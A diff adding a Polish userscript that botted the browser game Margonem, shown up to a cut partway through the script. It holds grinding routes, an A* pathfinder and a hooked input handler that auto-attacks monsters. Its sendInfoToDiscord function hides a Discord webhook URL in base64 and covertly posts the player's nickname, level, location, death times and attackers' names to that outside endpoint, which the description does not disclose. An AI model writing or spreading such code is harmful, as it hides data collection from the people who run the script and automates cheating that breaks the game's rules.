@@ -1,0 +1,724 @@
+// ==UserScript==
+// @name         'Bot z sellaniem i powrotem na exp
+// @version      1.88
+// @description  Bot z sellaniem i powrotem na exp
+// @author       Kot
+// @match        https://*.margonem.pl/
+// @grant        none
+// ==/UserScript==
+window.onload = () => {
+    window.adiwilkTestBot = new(function() {
+    //wy≥πczenie alertÛw i blokad,  chwilowe rozwiπzanie
+    mAlert = function() {};
+    //obiekt z nazwami expowisk
+    let expowiska = {
+        "Pizzeria(wszystkie levele)": {
+            map: "Podziemia - p.1, Podziemia - p.2, Odnoga kana≥u, Podziemia - p.1, Podziemia - p.3, Podziemia - p.1, Odnoga kana≥u, Podziemia - p.2"
+        },
+        "Szczury w Ithan": {
+            map: "Archiwa, Zaplecze, Sk≥ady, Przejúcie pÛ≥nocno-wschodnie, Wschodnie skrzyd≥o murÛw, Przejúcie po≥udniowo-wschodnie, Wschodnie skrzyd≥o murÛw, Przejúcie pÛ≥nocno-wschodnie, Sk≥ady, Zaplecze"
+        },
+        "start": {
+            map: "Osada åmia≥kÛw, Samotna Nizina"
+        },
+        "Nekropolia": {
+            map: "Grobowiec Rodziny Tywelta p.1, Grobowiec Rodziny Tywelta p.2"
+        },
+        "Demony": {
+            map: "Podziemia Siedziby Maga p.1 - sala 1, Podziemia Siedziby Maga p.2, Podziemia Siedziby Maga p.3 - sala 1, Podziemia Siedziby Maga p.3 - sala 2"
+        },
+        "Gacki szare": {
+            map: "Siedlisko Nietoperzy p.5, Siedlisko Nietoperzy p.4, Siedlisko Nietoperzy p.3, Siedlisko Nietoperzy p.2, Siedlisko Nietoperzy p.1, Siedlisko Nietoperzy p.2, Siedlisko Nietoperzy p.3, Siedlisko Nietoperzy p.4"
+        },
+        "MrÛwki": {
+            map: "Kopiec MrÛwek, Kopiec MrÛwek p.1, Kopiec MrÛwek p.2, Mrowisko p.2, Mrowisko p.1, Mrowisko, Mrowisko p.1, Mrowisko p.2, Kopiec MrÛwek p.2, Kopiec MrÛwek p.1"
+        },
+        "Zbiry": {
+            map: "PagÛrki £upieøcÛw, Kamienna KryjÛwka, Schowek na £upy, Sk≥ad GrabieøcÛw"
+        },
+        "Mulusy": {
+            map: "Osada MulusÛw, Pradawne WzgÛrze PrzodkÛw"
+        },
+        "Orki": {
+            map: "Opuszczony Bastion, Podziemne Przejúcie p.1, Podziemne Przejúcie p.2, Zrujnowana Wieøa, Opuszczony Bastion, Zrujnowana Wieøa, Podziemne Przejúcie p.2, Podziemne Przejúcie p.1"
+        },
+        "Ghule": {
+            map: "Polana åcierwojadÛw, Wioska Ghuli"
+        },
+        "Wilcze plemiÍ": {
+            map: "Warczπce Osuwiska, Wilcza Nora p.1, Wilcza Nora p.2, Wilcza Nora p.1",
+            mobs_id: [71698]
+        },
+        "≥otry": {
+            map: "Stary Kupiecki Trakt, Stukot Widmowych KÛ≥, Wertepy RzezimieszkÛw, Stukot Widmowych KÛ≥",
+
+        },
+        "Pajπki": {
+            map: "Rachminowa Jaskinia p.5, Rachminowa Jaskinia p.6 - rozlewisko, Rachminowa Jaskinia p.7 - bezdenna g≥Íbia, Rachminowa Jaskinia p.6 - rozlewisko"
+        },
+        "Koboldy": {
+            map: "Lazurytowa Grota p.1, Lazurytowa Grota p.2, Lazurytowa Grota p.3, Lazurytowa Grota p.2"
+        },
+        "Galaretki(te za pszczÛ≥kami)": {
+            map: "Prastara Kopalnia Eroch p.4 - sala 1, Prastara Kopalnia Eroch p.5"
+        },
+        "Szlak Thorpa": {
+            map: "Szlak Thorpa p.1, Szlak Thorpa p.2, Szlak Thorpa p.3, Szlak Thorpa p.4, Szlak Thorpa p.5, Szlak Thorpa p.6, Szlak Thorpa p.5, Szlak Thorpa p.4, Szlak Thorpa p.3, Szlak Thorpa p.2"
+        },
+        "Gnole": {
+            map: "Wioska Gnolli, CzeluúÊ Ognistej Poøogi"
+        },
+        "Mnisi sciezyna": {
+            map: "Piwnica OpÍtanych MnichÛw p.1, Piwnica OpÍtanych MnichÛw p.2, Piwnica OpÍtanych MnichÛw p.3, Piwnica OpÍtanych MnichÛw p.4, Piwnica OpÍtanych MnichÛw p.5, Piwnica OpÍtanych MnichÛw p.4, Piwnica OpÍtanych MnichÛw p.3, Piwnica OpÍtanych MnichÛw p.2"
+        },
+        "Bia≥e mrÛwki": {
+            map: "Szumiπca GÍstwina, Grota Bia≥ych Koúci p.1 - sala 2, Grota Bia≥ych Koúci p.2 - sala 2, Grota Bia≥ych Koúci p.3 - sala 2, Grota Bia≥ych Koúci p.4, Grota Bia≥ych Koúci p.3 - sala 1, Grota Bia≥ych Koúci p.4, Grota Bia≥ych Koúci p.3 - sala 2, Grota Bia≥ych Koúci p.2 - sala 2, Grota Bia≥ych Koúci p.1 - sala 2"
+        },
+        "Moje demilsze": {
+            map: "Kopalnia Thudul-ultok p.4 - sala 2, Kopalnia Thudul-ultok p.4 - sala 1, Kopalnia Thudul-ultok p.4 - sala 2, Chodniki Erebeth p.4 - sala 2, Chodniki Erebeth p.4 - sala 1, Chodniki Erebeth p.4 - sala 2"
+        },
+        "Demilisze-low": {
+            map: "Rachminowa Jaskinia p.3, Rachminowa Jaskinia p.4, Rachminowa Jaskinia p.4 - przepaúcie, Wπski chodnik p.4, Chodniki Erebeth p.4 - sala 1, Chodniki Erebeth p.4 - sala 2, Chodniki Erebeth p.4 - sala 1, Wπski chodnik p.4, Rachminowa Jaskinia p.4 - przepaúcie, Rachminowa Jaskinia p.4"
+        },
+        "Demilisze-high": {
+            map: "Rachminowa Jaskinia p.4 - przepaúcie, Wπski chodnik p.4, Chodniki Erebeth p.4 - sala 1, Chodniki Erebeth p.4 - sala 2, Kopalnia Thudul-ultok p.4 - sala 2, Kopalnia Thudul-ultok p.4 - sala 1, Kopalnia Thudul-ultok p.4 - sala 2, Chodniki Erebeth p.4 - sala 1, Wπski chodnik p.4"
+        },
+        "Minosy": {
+            map: "Labirynt WyklÍtych p.2 - sala 1, Labirynt WyklÍtych p.1, Labirynt WyklÍtych p.2 - sala 2, Labirynt WyklÍtych p.1",
+            ignore_grp: [23]
+        },
+        "Erem pÛ≥noc-po≥udnie": {
+            map: "Erem Czarnego S≥oÒca - sala wejúciowa, Erem Czarnego S≥oÒca p.1 s.1, Erem Czarnego S≥oÒca - sala wejúciowa, Erem Czarnego S≥oÒca p.2 s.1, Erem Czarnego S≥oÒca p.2 s.2, Erem Czarnego S≥oÒca - sala wejúciowa, Erem Czarnego S≥oÒca p.1 s.2, Erem Czarnego S≥oÒca - sala wejúciowa, Ska≥y Mroünych åpiewÛw, Erem Czarnego S≥oÒca - po≥udnie, Erem Czarnego S≥oÒca - lochy, Erem Czarnego S≥oÒca - pÛ≥noc, Ska≥y Mroünych åpiewÛw",
+            mobs_id: [34826]
+        },
+        "Grexy": {
+            map: "Grota Samotnych Dusz p.1, Grota Samotnych Dusz p.2, Grota Samotnych Dusz p.3, Grota Samotnych Dusz p.4, Grota Samotnych Dusz p.5, Grota Samotnych Dusz p.4, Grota Samotnych Dusz p.3, Grota Samotnych Dusz p.2"
+        },
+        "Miúki-low": {
+            map: "Firnowa Grota p.1, Firnowa Grota p.2, Firnowa Grota p.2 s.1, Firnowa Grota p.2, Ska≥y Mroünych åpiewÛw, Lodowa Wyrwa p.2, Lodowa Wyrwa p.1 s.1, Ska≥y Mroünych åpiewÛw",
+            mobs_id: [34843, 34826]
+        },
+        "Miúki-high": {
+            map: "Firnowa Grota p.1, Firnowa Grota p.2, Firnowa Grota p.2 s.1, Firnowa Grota p.2, Ska≥y Mroünych åpiewÛw, Lodowa Wyrwa p.2, Lodowa Wyrwa p.1 s.1, Lodowa Wyrwa p.1 s.2, Sala Lodowych Iglic, Lodowa Wyrwa p.1 s.2, Lodowa Wyrwa p.1 s.1, Ska≥y Mroünych åpiewÛw",
+            mobs_id: [34843, 34826]
+        },
+        "Piraci - dwie jaskinie": {
+            map: "Korsarska Nora - sala 1, Korsarska Nora - sala 2, Korsarska Nora - sala 3, Korsarska Nora - sala 4, Korsarska Nora p.1, Korsarska Nora - przejúcie 2, Korsarska Nora - przejúcie 3, Korsarska Nora p.2, Korsarska Nora - przejúcie 3, Korsarska Nora - przejúcie 2, Korsarska Nora - przejúcie 1, Korsarska Nora p.2, Korsarska Nora - przejúcie 1, Korsarska Nora - przejúcie 2, Korsarska Nora p.2, Korsarska Nora - przejúcie 2, Korsarska Nora p.1, Korsarska Nora - sala 4, Korsarska Nora - sala 3, Korsarska Nora - sala 2, Korsarska Nora - sala 1, Latarniane Wybrzeøe, Ukryta Grota Morskich Diab≥Ûw, Ukryta Grota Morskich Diab≥Ûw - arsena≥, Ukryta Grota Morskich Diab≥Ûw, Ukryta Grota Morskich Diab≥Ûw - siedziba, Ukryta Grota Morskich Diab≥Ûw, Ukryta Grota Morskich Diab≥Ûw - magazyn, Ukryta Grota Morskich Diab≥Ûw, Ukryta Grota Morskich Diab≥Ûw - skarbiec, Ukryta Grota Morskich Diab≥Ûw, Latarniane Wybrzeøe"
+        },
+        "Mumie": {
+            map: "Oaza Siedmiu WichrÛw, Ciche Rumowiska, Oaza Siedmiu WichrÛw, Ruiny Pustynnych Burz"
+        },
+        "Magradit-low": {
+            map: "Magradit, Magradit - GÛra Ognia, Wulkan Politraki p.4, Wulkan Politraki p.3 - sala 1, Wulkan Politraki p.3 - sala 2, Wulkan Politraki p.3 - sala 1, Wulkan Politraki p.4, Magradit - GÛra Ognia"
+        },
+        "Magradit-high": {
+            map: "Magradit, Magradit - GÛra Ognia, Wulkan Politraki p.4, Skalna Wyrwa, Wulkan Politraki p.4, Wulkan Politraki p.3 - sala 1, Wulkan Politraki p.3 - sala 2, Wulkan Politraki p.3 - sala 1, Wulkan Politraki p.4, Skalna wyrwa, Magradit - GÛra Ognia",
+            ignore_grp: [4]
+        },
+        "Kuünia Woundriela": {
+            map: "Kuünia Worundriela p.7 - sala 3, Kuünia Worundriela p.7 - sala 4"
+        },
+        "Berserkerzy": {
+            map: "Grobowiec PrzodkÛw, Cenotaf BerserkerÛw p.1, Grobowiec PrzodkÛw, Czarcie Oparzeliska, Pustelnia Wojownika p.2, Pustelnia Wojownika p.1, Czarcie Oparzeliska, Szuwarowe TrzÍsawisko, Opuszczona Twierdza, Szuwarowe TrzÍsawisko, Czarcie Oparzeliska, Pustelnia Wojownika p.1, Pustelnia Wojownika p.2, Czarcie Oparzeliska, Grobowiec PrzodkÛw, Cenotaf BerserkerÛw p.1"
+        },
+        "Gobliny": {
+            map: "Przedsionek Z≥ych GoblinÛw, GobliÒskie Lokum, Przedsionek Z≥ych GoblinÛw, Lokum Z≥ych GoblinÛw"
+        },
+        "Kazamaty": {
+            map: "Nawiedzone Kazamaty p.1, Nawiedzone Kazamaty p.2, Nawiedzone Kazamaty p.3, Nawiedzone Kazamaty p.4, Nawiedzone Kazamaty p.5, Nawiedzone Kazamaty p.6, Nawiedzone Kazamaty p.5, Nawiedzone Kazamaty p.4, Nawiedzone Kazamaty p.3, Nawiedzone Kazamaty p.2"
+        },
+        "Duchy - dla leszczy": {
+            map: "Ruiny Tass Zhil, Przedsionek Grobowca, Ruiny Tass Zhil, B≥ota Sham Al",
+            ignore_grp: [18]
+        },
+        "Duchy - dla koxÛw": {
+            map: "Ruiny Tass Zhil, Przedsionek Grobowca, Tajemne Przejúcie, PrzeklÍty Grobowiec, Ruiny Tass Zhil, B≥ota Sham Al"
+        },
+        "Ingotia": {
+            map: "Wyspa Ingotia - po≥udnie, Jaskinia Rogog≥owych - aula, Sala Nici Ocalenia p.6, Sala Bia≥ego Byka p.5, Sala Nici Ocalenia p.6, Komnata PrzeklÍtego Daru p.5, Jaskinia Rogog≥owych - aula, Sala Øπdzy p.5, Hala OdszczepieÒcÛw p.4, Sala Øπdzy p.5, Komora Opuszczonych p.3, Jaskinia Rogog≥owych - aula, Komnata WygnaÒcÛw p.3, Komora Budowniczego p.5, Komnata WygnaÒcÛw p.3, Jaskinia Rogog≥owych p.2, Jaskinia Rogog≥owych - aula, Jaskinia Rogog≥owych p.1 - wyjúcie, Wyspa Ingotia - pÛ≥noc, Jaskinia Rogog≥owych p.1 - wyjúcie, Jaskinia Rogog≥owych - aula, Jaskinia Rogog≥owych p.2, Komnata WygnaÒcÛw p.3, Komora Budowniczego p.5, Komnata WygnaÒcÛw p.3, Jaskinia Rogog≥owych - aula, Komora Opuszczonych p.3, Sala Øπdzy p.5, Hala OdszczepieÒcÛw p.4, Sala Øπdzy p.5, Jaskinia Rogog≥owych - aula, Komnata PrzeklÍtego Daru p.5, Sala Nici Ocalenia p.6, Sala Bia≥ego Byka p.5, Sala Nici Ocalenia p.6, Jaskinia Rogog≥owych - aula"
+        },
+        "SK dla leszczy": {
+            map: "Nawiedzone Komnaty p.1, Nawiedzone Komnaty p.2, Sala KrÛlewska, Nawiedzone Komnaty p.2"
+        },
+        "SK dla koxÛw": {
+            map: "Nawiedzone Komnaty p.1, Nawiedzone Komnaty p.2, Sala KrÛlewska, Komnata Czarnej Per≥y, Sala KrÛlewska, Nawiedzone Komnaty p.2",
+            ignore_grp: [14]
+        },
+        "Patrycjusze": {
+            map: "Krypty Bezsennych p .1, Krypty Bezsennych p .2, Krypty Bezsennych p .2 - przejúcie - sala 1, Krypty Bezsennych p .2 - przejúcie - sala 2, Krypty Bezsennych p .2, Krypty Bezsennych p .3, Krypty Bezsennych p .2, Krypty Bezsennych p .2 - przejúcie - sala 2, Krypty Bezsennych p .2 - przejúcie - sala 1, Krypty Bezsennych p .2"
+        },
+        "Sekta": {
+            map: "Przedsionek Kultu, Tajemnicza Siedziba, Mroczne Komnaty, Przeraøajπce Sypialnie, Mroczne Komnaty, Tajemnicza Siedziba, Sala Tysiπca åwiec, Tajemnicza Siedziba, Lochy Kultu, Sale Rozdzierania, Lochy Kultu, Tajemnicza Siedziba"
+        },
+        "sadolka+niøej": {
+            map: "Mroczne Komnaty, Przeraøajπce Sypialnie",
+            ignore_grp: [9]
+        },
+        "Pajπki": {
+            map: "Dolina PajÍczych Korytarzy, Arachnitopia p.1, Arachnitopia p.2, Arachnitopia p.3, Arachnitopia p.4, Arachnitopia p.5, Arachnitopia p.4, Arachnitopia p.3, Arachnitopia p.2, Arachnitopia p.1"
+        },
+        "Zakorzeniony Lud": {
+            map: "Urwisko Zdrewnia≥ych, WπwÛz Zakorzenionych Dusz, Krzaczasta Grota p.2 - sala 2, Krzaczasta Grota p.2 - sala 3, Krzaczasta Grota p.2 - sala 1, Krzaczasta Grota p.2 - sala 3, Krzaczasta Grota p.1 - sala 3, Krzaczasta Grota p.1 - sala 2, Krzaczasta Grota p.1 - sala 1, WπwÛz Zakorzenionych Dusz, Regiel Zab≥πkanych, èrÛd≥o Zakorzenionego Ludu, Regiel Zab≥πkanych, WπwÛz Zakorzenionych Dusz"
+        },
+        "Maddoki ca≥e": {
+            map: "Zawodzπce Kaskady, Skryty Azyl, Z≥ota Dπbrowa, Oúlizg≥e Przejúcie - sala 1, Oúlizg≥e Przejúcie - sala 2, Z≥ota Dπbrowa, Mglisty Las, Grota poroúniÍtych StalagmitÛw - sala wyjúciowa, Grota poroúniÍtych StalagmitÛw - przejúcie, Grota poroúniÍtych StalagmitÛw - sala boczna, Grota poroúniÍtych, StalagmitÛw - przejúcie, Grota poroúniÍtych StalagmitÛw - sala g≥Ûwna, Grota poroúniÍtych StalagmitÛw - przejúcie, Grota poroúniÍtych StalagmitÛw - sala wyjúciowa, Mglisty Las, Z≥ota Dπbrowa, Dolina Pe≥znπcego Krzyku, GrzÍzawisko Rozpaczy, Zatrute Torfowiska, Gnijπce Topielisko, Bagna Umar≥ych, Gnijπce Topielisko, Zatrute Torfowiska, GrzÍzawisko Rozpaczy, Dolina Pe≥znπcego Krzyku, Z≥ota Dπbrowa, Mglisty Las, Grota poroúniÍtych StalagmitÛw - sala wyjúciowa, Grota poroúniÍtych StalagmitÛw - przejúcie, Grota poroúniÍtych StalagmitÛw - sala g≥Ûwna, Grota poroúniÍtych StalagmitÛw - przejúcie, Grota poroúniÍtych StalagmitÛw - sala boczna, Grota poroúniÍtych StalagmitÛw - przejúcie, Grota poroúniÍtych StalagmitÛw - sala wyjúciowa, Mglisty Las, Z≥ota Dπbrowa, Oúlizg≥e Przejúcie - sala 2, Oúlizg≥e Przejúcie - sala 1, Z≥ota Dπbrowa, Skryty Azyl"
+        },
+        "Mahopteki dla leszczy": {
+            map: "Altepetl Mahoptekan, Niecka Xiuh Atl, Dolina Chmur, Niecka Xiuh Atl, Altepetl Mahoptekan, Dolina Chmur, Z≥ota GÛra p.1, Z≥ota GÛra p.2, Z≥ota GÛra p.3, Z≥ota GÛra p.2, Z≥ota GÛra p.1, Dolina Chmur, Altepetl Mahoptekan, Mictlan p.1, Mictlan p.2, Mictlan p.3, Mictlan p.4, Mictlan p.5, Mictlan p.4, Mictlan p.3, Mictlan p.2, Mictlan p.1"
+        },
+        "Mahopteki-high": {
+            map: "Altepetl Mahoptekan, Niecka Xiuh Atl, Dolina Chmur, Niecka Xiuh Atl, Altepetl Mahoptekan, Dolina Chmur, Z≥ota GÛra p.1, Z≥ota GÛra p.2, Z≥ota GÛra p.3, Z≥ota GÛra p.2, Z≥ota GÛra p.1, Dolina Chmur, Altepetl Mahoptekan, Mictlan p.1, Mictlan p.2, Mictlan p.3, Mictlan p.4, Mictlan p.5, Mictlan p.6, Mictlan p.7, Mictlan p.8, Mictlan p.7, Mictlan p.6, Mictlan p.5, Mictlan p.4, Mictlan p.3, Mictlan p.2, Mictlan p.1"
+        },
+        "Katy zarobek": {
+            map: "Katakumby Gwa≥townej åmierci, Korytarz Porzuconych MarzeÒ, Katakumby OpÍtanych Dusz, Katakumby Odnalezionych SkrytobÛjcÛw, Korytarz Porzuconych Nadziei, Katakumby OpÍtanych Dusz, Zachodni Tunel Jaüni, Katakumby Krwawych Wypraw, Wschodni Tunel Jaüni"
+        },
+        "Pustynia Shairhoud?": {
+            map: "Pustynia Shaiharrud - wschÛd, Jurta Nomadzka, Pustynia Shaiharrud - wschÛd, Grota PoúwiÍcenia, Pustynia Shaiharrud - wschÛd, Namiot Pustynnych SmokÛw, Pustynia Shaiharrud - wschÛd, Pustynia Shaiharrud - zachÛd, Jaskinia Piaskowej Burzy s.1, Jaskinia Piaskowej Burzy s.2, Namiot Naznaczonych, Pustynia Shaiharrud - zachÛd, Namiot Piechoty Pi≥owej, Pustynia Shaiharrud - zachÛd, Jaskinia SzczÍk, Jurta Czcicieli, Pustynia Shaiharrud - zachÛd, Namiot Gwardii SmokoszczÍkich, Pustynia Shaiharrud - zachÛd, SÍpiarnia, Pustynia Shaiharrud - zachÛd, Jaskinia Smoczej Paszczy p.1, Jaskinia Smoczej Paszczy p.2, Jaskinia Smoczej Paszczy p.1, Jurta Chaegda, Pustynia Shaiharrud - zachÛd, Smocze Skalisko, Jaskinia Odwagi, Smocze Skalisko, Urwisko Vapora, Smocze Skalisko, Pustynia Shaiharrud - zachÛd"
+        }
+    };
+
+    //algorytm A*
+    class AStar {
+        constructor(collisionsString, width, height, start, end, additionalCollisions) {
+            this.width = width;
+            this.height = height;
+            this.collisions = this.parseCollisions(collisionsString, width, height);
+            this.additionalCollisions = additionalCollisions || {};
+            this.start = this.collisions[start.x][start.y];
+            this.end = this.collisions[end.x][end.y];
+            this.start.beginning = true;
+            this.start.g = 0;
+            this.start.f = heuristic(this.start, this.end);
+            this.end.target = true;
+            this.end.g = 0;
+            this.addNeighbours();
+            this.openSet = [];
+            this.closedSet = [];
+            this.openSet.push(this.start);
+        }
+
+        parseCollisions(collisionsString, width, height) {
+            const collisions = new Array(width);
+            for (let w = 0; w < width; w++) {
+                collisions[w] = new Array(height);
+                for (let h = 0; h < height; h++) {
+                    collisions[w][h] = new Point(w, h, collisionsString.charAt(w + h * width) === '1');
+                }
+            }
+            return collisions;
+        }
+
+        addNeighbours() {
+            for (let i = 0; i < this.width; i++) {
+                for (let j = 0; j < this.height; j++) {
+                    this.addPointNeighbours(this.collisions[i][j])
+                }
+            }
+        }
+
+        addPointNeighbours(point) {
+            const x = point.x,
+                y = point.y;
+            const neighbours = [];
+            if (x > 0) neighbours.push(this.collisions[x - 1][y]);
+            if (y > 0) neighbours.push(this.collisions[x][y - 1]);
+            if (x < this.width - 1) neighbours.push(this.collisions[x + 1][y]);
+            if (y < this.height - 1) neighbours.push(this.collisions[x][y + 1]);
+            point.neighbours = neighbours;
+        }
+
+        anotherFindPath() {
+            while (this.openSet.length > 0) {
+                let currentIndex = this.getLowestF();
+                let current = this.openSet[currentIndex];
+                if (current === this.end) return this.reconstructPath();
+                else {
+                    this.openSet.splice(currentIndex, 1);
+                    this.closedSet.push(current);
+                    for (const neighbour of current.neighbours) {
+                        if (this.closedSet.includes(neighbour)) continue;
+                        else {
+                            const tentative_score = current.g + 1;
+                            let isBetter = false;
+                            if (this.end == this.collisions[neighbour.x][neighbour.y] || (!this.openSet.includes(neighbour) && !neighbour.collision && !this.additionalCollisions[neighbour.x + 256 * neighbour.y])) {
+                                this.openSet.push(neighbour);
+                                neighbour.h = heuristic(neighbour, this.end);
+                                isBetter = true;
+                            } else if (tentative_score < neighbour.g && !neighbour.collision) {
+                                isBetter = true;
+                            }
+                            if (isBetter) {
+                                neighbour.previous = current;
+                                neighbour.g = tentative_score;
+                                neighbour.f = neighbour.g + neighbour.h;
+                            }
+                        }
+                    }
+                }
+            }
+        }
+
+        getLowestF() {
+            let lowestFIndex = 0;
+            for (let i = 0; i < this.openSet.length; i++) {
+                if (this.openSet[i].f < this.openSet[lowestFIndex].f) lowestFIndex = i;
+            }
+            return lowestFIndex;
+        }
+
+        reconstructPath() {
+            const path = [];
+            let currentNode = this.end;
+            while (currentNode !== this.start) {
+                path.push(currentNode);
+                currentNode = currentNode.previous;
+            }
+            return path;
+        }
+    }
+
+    class Point {
+        constructor(x, y, collision) {
+            this.x = x;
+            this.y = y;
+            this.collision = collision;
+            this.g = 10000000;
+            this.f = 10000000;
+            this.neighbours = [];
+            this.beginning = false;
+            this.target = false;
+            this.previous = undefined;
+        }
+    }
+
+    function heuristic(p1, p2) {
+        return Math.abs(p1.x - p2.x) + Math.abs(p1.y - p2.y);
+    }
+
+    function a_getWay(x, y) {
+        return (new AStar(map.col, map.x, map.y, {
+            x: hero.x,
+            y: hero.y
+        }, {
+            x: x,
+            y: y
+        }, g.npccol)).anotherFindPath();
+    }
+
+    function a_goTo(x, y) {
+        let _road_ = a_getWay(x, y);
+        if (!Array.isArray(_road_)) return;
+        window.road = _road_;
+    }
+
+
+    //localStorage dla ostatnich mapek
+    if (!localStorage.getItem(`adi-bot_lastmaps`)) {
+        localStorage.setItem(`adi-bot_lastmaps`, JSON.stringify(new Array()));
+    }
+
+    let self = this;
+    let blokada = false;
+    let blokada2 = false;
+    let $m_id;
+    let herolx,
+        heroly,
+        increment = 0;
+
+
+    let bolcka = false;
+    let start = false;
+
+    g.loadQueue.push({
+        fun: () => {
+            start = true;
+        }
+    });
+
+    let deade = true;
+    let globalArray = new Array();
+
+    function addToGlobal(id) {
+        let npc = g.npc[id];
+        if (npc.grp) {
+            for (let i in g.npc) {
+                if (g.npc[i].grp == npc.grp && !globalArray.includes(g.npc[i].id)) {
+                    globalArray.push(g.npc[i].id);
+                }
+            }
+        } else if (!globalArray.includes(id)) {
+            globalArray.push(id);
+        }
+    }
+
+    function chceckBlockade() {
+        for (let i in g.npc) {
+            let n = g.npc[i];
+            if ((n.type == 2 || n.type == 3) && n.wt < 19 && checkGrp(n.id) && hero.lvl + 30 >= n.lvl && Math.abs(hero.x - n.x) < 2 && Math.abs(hero.y - n.y) < 2 && checkHeroHp()) {
+                return _g(`fight&a=attack&ff=1&id=-${n.id}`);
+            }
+        }
+    }
+
+
+    function sendInfoToDiscord(txt) {
+        let u = atob("aHR0cHM6Ly9kaXNjb3JkYXBwLmNvbS9hcGkvd2ViaG9va3MvNDc3NjYzNTM1NDAxMjcxMzE2L1V5ZmtfS194cUY3bFpnN3lycTl4SUVWMEREZ1dMVlEySVlMZFA4akhRdWhrUFNGbENqZlpOSVRhQmhzSnA1ekVtTVlu");
+        $.ajax({
+            url: u,
+            type: 'POST',
+            data: JSON.stringify({
+                content: txt,
+                username: hero.nick,
+                avatar_url: `http://jaruna.margonem.pl/obrazki/itemy/upg/upg01.gif`
+            }),
+            contentType: 'application/json; charset=utf-8',
+            dataType: 'json',
+            async: false
+        });
+    }
+
+    function getTime() {
+        let czas = new Date(),
+            godzina = czas.getHours(),
+            sekunda = czas.getSeconds(),
+            minuta = czas.getMinutes();
+        if (godzina < 10) godzina = `0${godzina}`;
+        if (minuta < 10) minuta = `0${minuta}`;
+        if (sekunda < 10) sekunda = `0${sekunda}`;
+        return `${godzina}:${minuta}:${sekunda}`;
+    }
+
+    //testowa opcja
+    setInterval(function() {
+        if ($m_id) {
+            $m_id = undefined;
+        }
+    }, 4000);
+    let $map_cords = undefined;
+    this.PI = parseInput;
+    parseInput = function(a) {
+        let ret = self.PI.apply(this, arguments); //tutaj doda≥em chwilowo poki nie daje rady xd
+        if (!g.battle && !g.dead && start) {
+            if (!$m_id && !bolcka) {
+                $m_id = self.findBestMob();
+                if (!$m_id && localStorage.getItem(`adi-bot_expowiska`)) {
+                    let tmp_naj1,
+                        tmp_naj2 = 9999;
+                    if (expowiska[localStorage.getItem(`adi-bot_expowiska`)].mobs_id) {
+                        let exP_mobs = expowiska[localStorage.getItem(`adi-bot_expowiska`)].mobs_id;
+                        for (let i in exP_mobs) {
+                            if (g.npc[exP_mobs[i]]) {
+                                tmp_naj1 = a_getWay(g.npc[exP_mobs[i]].x, g.npc[exP_mobs[i]].y).length;
+                                if (tmp_naj1 < tmp_naj2) {
+                                    tmp_naj2 = tmp_naj1;
+                                    $m_id = exP_mobs[i];
+                                }
+                            }
+                        }
+                    }
+                }
+                blokada2 = false;
+                blokada = false;
+            }
+            if ($m_id) {
+                let mob = g.npc[$m_id];
+                if (!mob) {
+                    $m_id = undefined;
+                    return ret;
+                }
+                if (Math.abs(hero.x - mob.x) < 2 && Math.abs(hero.y - mob.y) < 2 && !blokada) {
+                    blokada = true;
+                    if (checkGrp(mob.id)) {
+                        _g(`fight&a=attack&ff=1&id=-${mob.id}`, function(res) {
+                            //sprawdzenie czy walczy z innym
+                            if (res.alert && res.alert == `Przeciwnik walczy juø z kimú innym`) {
+                                addToGlobal(mob.id);
+                                $m_id = undefined;
+                            }
+                        });
+                    }
+                    setTimeout(function() {
+                        $m_id = undefined;
+                    }, 500);
+                } else if (!blokada2 && !blokada) {
+                    a_goTo(mob.x, mob.y);
+                    blokada2 = true;
+                }
+            } else if (document.querySelector(`#adi-bot_maps`).value.length > 0) {
+                //g.gwIds - obiekt id mapy i kordy -> 1: `1.13`
+                //g.townname - obiekt id mapy i nazwa -> 1: `Ithan`
+                $map_cords = self.findBestGw();
+                if ($map_cords && !bolcka) {
+                    if (hero.x == $map_cords.x && hero.y == $map_cords.y) {
+                        _g(`walk`);
+                    } else {
+                        a_goTo($map_cords.x, $map_cords.y);
+                        bolcka = true;
+                        setTimeout(function() {
+                            bolcka = false;
+                        }, 2000);
+                    }
+                }
+            }
+
+            if (heroly == hero.y && herolx == herolx) {
+                increment++;
+                if (increment > 4) {
+                    chceckBlockade();
+                    increment = 0;
+                    $m_id = undefined;
+                    $map_cords = undefined;
+                    bolcka = false;
+                }
+            } else {
+                heroly = hero.y;
+                herolx = hero.x;
+                increment = 0;
+            }
+        }
+
+        //wylogowanie po dedzie na g≥Ûwnπ
+        if (g.dead && deade) {
+            deade = false;
+            sendInfoToDiscord(`Pad≥em na ${hero.lvl}${hero.prof} - ${getTime()}`);
+            document.location.href = `http://margonem.pl`;
+        }
+
+        //rozpoczecie walki
+        if (a.hasOwnProperty("f") && a.f.init == 1 && hero.clan > 0) {
+            if (!Object.keys(a.f.w).some(id => id < 0)) {
+                const team1 = [],
+                    team2 = [];
+                for (let x of Object.values(a.f.w))
+                    x.team == 1 && team1.push(`${x.name} ${x.lvl}${x.prof}`) || team2.push(`${x.name} ${x.lvl}${x.prof} `);
+                if (a.f.myteam == 2 && document.querySelector(`#adi-bot_maps`).value.indexOf(map.name) > -1) {
+                    const msg = `Zosta≥em zaatakowany na mapie ${map.name} o godzinie ${getTime()}.\n${team1.join(", ")} vs. ${team2.join(", ")}`;
+                    if (hero.clan > 0) window.chatSend(`/k Zosta≥em zaatakowany na mapie ${map.name} o godzinie ${getTime()}. ${team1.join(", ")} vs. ${team2.join(", ")}`);
+                    sendInfoToDiscord(msg);
+                }
+            }
+        }
+        return ret;
+    }
+
+    function checkGrp(id) {
+        if (g.npc[id].grp) { //tutaj
+            if (!checke2(g.npc[id].grp) || (expowiska[localStorage.getItem(`adi-bot_expowiska`)].ignore_grp && expowiska[localStorage.getItem(`adi-bot_expowiska`)].ignore_grp.includes(g.npc[id].grp))) {
+                return false;
+            }
+        }
+        return true;
+    }
+
+    function checke2(grpid) {
+        for (let i in g.npc) {
+            if (g.npc[i].grp == grpid && g.npc[i].wt > 19) {
+                return false;
+            }
+        }
+        return true;
+    }
+
+    function checkHeroHp() {
+        if (hero.hp / hero.maxhp * 100 > 70) {
+            return true;
+        }
+        return false;
+    }
+
+    this.findBestMob = function() {
+        let b1,
+            b2 = 9999,
+            id;
+        for (let i in g.npc) {
+            let n = g.npc[i];
+            let xxx;
+            let min;
+            let max;
+            if (document.querySelector(`#adi-bot_mobs`).value.indexOf(`-`) > -1) {
+                xxx = document.querySelector(`#adi-bot_mobs`).value.split(`-`);
+                min = parseInt(xxx[0]);
+                max = parseInt(xxx[1]);
+            }
+
